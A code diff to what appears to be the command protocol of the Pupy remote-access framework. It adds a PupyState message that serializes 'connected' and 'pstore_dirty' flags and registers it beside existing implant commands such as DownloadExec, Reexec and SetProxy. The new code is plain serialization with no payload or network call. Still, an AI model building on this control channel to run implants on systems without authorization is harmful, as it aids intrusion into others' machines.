@@ -781,6 +781,37 @@ class OnlineStatusRequest(Command):
     def __repr__(self):
         return '{ONLINE-STATUS-REQUEST}'
 
+class PupyState(Command):
+    @staticmethod
+    def unpack(data):
+        records_count, = struct.unpack_from('B', data)
+        records = struct.unpack_from('B'*records_count, data[1:])
+
+        connected = records[0] & ( 1 << 0 )
+        pstore_dirty = records[0] & ( 1 << 1 )
+
+        return PupyState(connected, pstore_dirty), records_count + 1
+
+    def pack(self):
+        records_count = 1
+        record = 0
+        if self.connected:
+            record |= 0x1 << 0
+
+        if self.pstore_dirty:
+            record |= 0x1 << 1
+
+        return struct.pack(
+            'B' + 'B'*records_count, records_count, record)
+
+    def __init__(self, connected=False, pstore_dirty=False):
+        self.connected = connected
+        self.pstore_dirty = pstore_dirty
+
+    def __repr__(self):
+        return '{{PUPY-STATE: CONNECTED={} PSTORE={}}}'.format(
+            self.connected, self.pstore_dirty)
+
 class ConnectablePort(Command):
     @staticmethod
     def unpack(data):
@@ -867,7 +898,7 @@ class Parcel(object):
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
         Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
         SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort,
-        PortQuizPort
+        PortQuizPort, PupyState
     ]
 
     commands_decode = dict(enumerate(commands))
